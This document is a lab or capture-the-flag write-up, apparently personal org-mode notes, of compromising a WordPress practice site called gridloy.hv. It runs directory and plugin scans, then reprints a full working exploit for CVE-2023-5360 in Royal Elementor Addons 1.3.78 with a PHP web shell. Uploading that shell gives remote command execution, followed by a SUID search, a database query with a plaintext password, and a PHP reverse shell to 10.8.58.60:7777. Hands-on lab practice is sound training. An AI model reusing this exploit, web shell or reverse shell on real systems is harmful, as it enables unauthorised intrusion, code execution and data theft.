#+title: Gridloy News
#+author:gabriel

* intro
Recently, a mysterious writer using the pseudonym "Currol" has been publishing striking and influential news articles. The true identity of this writer remains a major mystery. Currol is particularly known for his in-depth analyses in the field of politics, making a name internationally. However, there is no information available about who is behind these writings.

Your task is to uncover the real identity of Currol. In this process, your job will involve vulnerability research on the website where the writer's articles are published.

* initial scan
#+begin_src sh
feroxbuster --url http://gridloy.hv -w /usr/share/wordlists/SecLists/Discovery/Web-Content/raft-medium
-directories.txt

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.12.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://gridloy.hv
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/wordlists/SecLists/Discovery/Web-Content/raft-medium-directories.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.12.0
 🔎  Extract Links         │ true
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
404      GET        9l       31w      272c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
403      GET        9l       28w      275c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
[>-------------------] - 2s         8/30000   4h      found:0       errors:0
🚨 Caught ctrl+c 🚨 saving scan state to ferox-http_gridloy_hv-1759453597.state ...
[>-------------------] - 2s         8/30000   4h      found:0       errors:0
[--------------------] - 2s         0/30000   0/s
#+end_src

A aplicação está rodando em um CMS, neste caso wordpress ->
#+begin_src sh
wpscan --url http://gridloy.hv

[i] Plugin(s) Identified:

[+] elementor
 | Location: http://gridloy.hv/wp-content/plugins/elementor/
 | Last Updated: 2025-06-04T15:00:00.000Z
 | [!] The version is out of date, the latest version is 3.29.2
 |
 | Found By: Urls In Homepage (Passive Detection)
 |
 | Version: 3.18.3 (100% confidence)
 | Found By: Query Parameter (Passive Detection)
 |  - http://gridloy.hv/wp-content/plugins/elementor/assets/js/frontend.min.js?ver=3.18.3
 | Confirmed By:
 |  Readme - Stable Tag (Aggressive Detection)
 |   - http://gridloy.hv/wp-content/plugins/elementor/readme.txt
 |  Readme - ChangeLog Section (Aggressive Detection)
 |   - http://gridloy.hv/wp-content/plugins/elementor/readme.txt

[+] royal-elementor-addons
 | Location: http://gridloy.hv/wp-content/plugins/royal-elementor-addons/
 | Last Updated: 2025-06-10T09:59:00.000Z
 | [!] The version is out of date, the latest version is 1.7.1025
 |
 | Found By: Urls In Homepage (Passive Detection)
 |
 | Version: 1.3.78 (80% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 |  - http://gridloy.hv/wp-content/plugins/royal-elementor-addons/readme.txt

[+] Enumerating Config Backups (via Passive and Aggressive Methods)
 Checking Config Backups - Time: 00:00:07 <==========================================================> (137 / 137) 100.00% Time: 00:00:07

[i] No Config Backups Found.

[!] No WPScan API Token given, as a result vulnerability data has not been output.
[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register

[+] Finished: Thu Oct  2 22:10:54 2025
[+] Requests Done: 174
[+] Cached Requests: 5
[+] Data Sent: 43.703 KB
[+] Data Received: 366.577 KB
[+] Memory used: 292.848 MB
[+] Elapsed time: 00:00:21
#+end_src

* vulnerable plugin Royal Elementor 1.3.78
O plugin Royal Elementor Addons na versão 1.3.78 possui uma CVE publicada ->

Royal Elementor Addons and Templates 1.3.78 - Unauthenticated Arbitrary File Upload ->
- https://www.exploit-db.com/exploits/52127


#+begin_src python CVE-2023-5360
# Exploit Title: WordPress Plugin Royal Elementor Addons <= 1.3.78 - Unauthenticated Arbitrary File Upload (RCE)
# Date: 2025-04-04
# Exploit Author: Sheikh Mohammad Hasan (https://github.com/4m3rr0r)
# Vendor Homepage: https://royal-elementor-addons.com
# Software Link: https://downloads.wordpress.org/plugin/royal-elementor-addons.1.3.78.zip
# Version: <= 1.3.78
# Tested on: WordPress 6.3.1, Royal Elementor Addons 1.3.78, Ubuntu 22.04 + Apache2 + PHP 8.1
# CVE: CVE-2023-5360

# Description:
# The Royal Elementor Addons and Templates WordPress plugin before 1.3.79 does not properly validate uploaded files,
# which allows unauthenticated users to upload arbitrary files (such as .php), leading to Remote Code Execution (RCE).

import requests
import json
import re
import argparse
import tempfile
from urllib.parse import urljoin
from rich.console import Console

requests.packages.urllib3.disable_warnings()
console = Console()

def get_nonce(target):
    try:
        r = requests.get(target, verify=False, timeout=10)
        m = re.search(r'var\s+WprConfig\s*=\s*({.*?});', r.text)
        if m:
            nonce = json.loads(m.group(1)).get("nonce")
            return nonce
    except:
        pass
    return None

def upload_shell(target, nonce, file_path):
    ajax_url = urljoin(target, "/wp-admin/admin-ajax.php")
    with open(file_path, "rb") as f:
        files = {"uploaded_file": ("poc.ph$p", f.read())}
    data = {
        "action": "wpr_addons_upload_file",
        "max_file_size": 0,
        "allowed_file_types": "ph$p",
        "triggering_event": "click",
        "wpr_addons_nonce": nonce
    }
    try:
        r = requests.post(ajax_url, data=data, files=files, verify=False, timeout=10)
        if r.status_code == 200 and "url" in r.text:
            resp = json.loads(r.text)
            return resp["data"]["url"]
    except:
        pass
    return None

def generate_default_shell():
    with tempfile.NamedTemporaryFile(delete=False, suffix=".php") as tmp:
        shell_code = '<?php echo "Shell by 4m3rr0r - "; system($_GET["cmd"]); ?>'
        tmp.write(shell_code.encode())
        return tmp.name

def main():
    parser = argparse.ArgumentParser(description="Royal Elementor Addons <= 1.3.78 - Unauthenticated Arbitrary File Upload (RCE)")
    parser.add_argument("-u", "--url", required=True, help="Target WordPress URL (e.g., https://target.com/)")
    parser.add_argument("-f", "--file", help="Custom PHP shell file to upload")
    args = parser.parse_args()

    console.print("[cyan][*] Getting nonce from WprConfig JS object...[/cyan]")
    nonce = get_nonce(args.url)
    if not nonce:
        console.print("[red][-] Failed to retrieve WprConfig nonce.[/red]")
        return

    console.print(f"[green][+] Nonce found: {nonce}[/green]")

    if args.file:
        shell_file = args.file
        console.print(f"[cyan][*] Using provided shell: {shell_file}[/cyan]")
    else:
        console.print("[cyan][*] No shell provided. Creating default RCE shell...[/cyan]")
        shell_file = generate_default_shell()
        console.print(f"[green][+] Default shell created at: {shell_file}[/green]")

    console.print("[cyan][*] Uploading shell...[/cyan]")
    uploaded_url = upload_shell(args.url, nonce, shell_file)

    if uploaded_url:
        console.print(f"[green][+] Shell uploaded successfully: {uploaded_url}[/green]")
        if not args.file:
            console.print(f"[yellow][>] Access it with: {uploaded_url}?cmd=id[/yellow]")
    else:
        console.print("[red][-] Upload failed. Target may be patched or not vulnerable.[/red]")

if __name__ == "__main__":
    main()
#+end_src

Upload do web-shell na aplicação via wp-content/uploads ->
#+begin_src sh
[22:15][]~ ✮ python3 e.py -u http://gridloy.hv -f cmd.php
/home/ilak/.local/lib/python3.12/site-packages/requests/__init__.py:102: RequestsDependencyWarning: urllib3 (1.26.20) or cha
rdet (5.2.0)/charset_normalizer (2.0.12) doesn't match a supported version!
  warnings.warn("urllib3 ({}) or chardet ({})/charset_normalizer ({}) doesn't match a supported "
[*] Getting nonce from WprConfig JS object...
[+] Nonce found: 74189f3c2b
[*] Using provided shell: cmd.php
[*] Uploading shell...
[+] Shell uploaded successfully: http://gridloy.hv/wp-content/uploads/wpr-addons/forms/poc-1.php

#+end_src

Request com o webshell ->
: http://gridloy.hv/wp-content/uploads/wpr-addons/forms/poc.php?cmd=ls

: poc-1.php poc.php

*SUID search* ->
#+begin_src java
GET /wp-content/uploads/wpr-addons/forms/poc.php?cmd=find%20%2f%20-type%20f%20-perm%20-4000%20-ls%202%3e%2fdev%2fnull HTTP/1.1
Host: gridloy.hv
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
Cookie: comment_author_email_1c487e52fac82b581f32dc7e5cb4c6dd=admin%40email.com; comment_author_1c487e52fac82b581f32dc7e5cb4c6dd=alert%281%29
Connection: keep-alive
#+end_src

*response* ->
#+begin_src html
HTTP/1.1 200 OK
Date: Fri, 03 Oct 2025 00:39:30 GMT
Server: Apache/2.4.56 (Debian)
Vary: Accept-Encoding
Content-Length: 915
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive
Content-Type: text/html; charset=UTF-8

     4132     36 -rwsr-xr-x   1 root     root        35040 Jan 20  2022 /usr/bin/umount
      110     64 -rwsr-xr-x   1 root     root        63960 Feb  7  2020 /usr/bin/passwd
     4130     56 -rwsr-xr-x   1 root     root        55528 Jan 20  2022 /usr/bin/mount
      109     88 -rwsr-xr-x   1 root     root        88304 Feb  7  2020 /usr/bin/gpasswd
     3763     72 -rwsr-xr-x   1 root     root        71912 Jan 20  2022 /usr/bin/su
      106     60 -rwsr-xr-x   1 root     root        58416 Feb  7  2020 /usr/bin/chfn
      107     52 -rwsr-xr-x   1 root     root        52880 Feb  7  2020 /usr/bin/chsh
     3604     44 -rwsr-xr-x   1 root     root        44632 Feb  7  2020 /usr/bin/newgrp
   138991    472 -rwsr-xr-x   1 root     root       481608 Dec 21  2023 /usr/lib/openssh/ssh-keysign
   132405     52 -rwsr-xr--   1 root     messagebus    51336 Jun  6  2023 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
#+end_src

** contune from here
#+begin_src php
php -r 'print(shell_exec("mysql -u wpuser -pG6gD6C9XncgPMeyx wordpressdb -e \"SELECT * FROM wp_comments;\""));'%
#+end_src
: php%20-r%20'%24sock%3dfsockopen(%2210.8.58.60%22%2c7777)%3bexec(%22%2fbin%2fsh%20-i%20%3c%263%20%3e%263%202%3e%263%22)%3b'

: php -r '$sock=fsockopen("10.8.58.60",7777);exec("/bin/sh -i <&3 >&3 2>&3");'
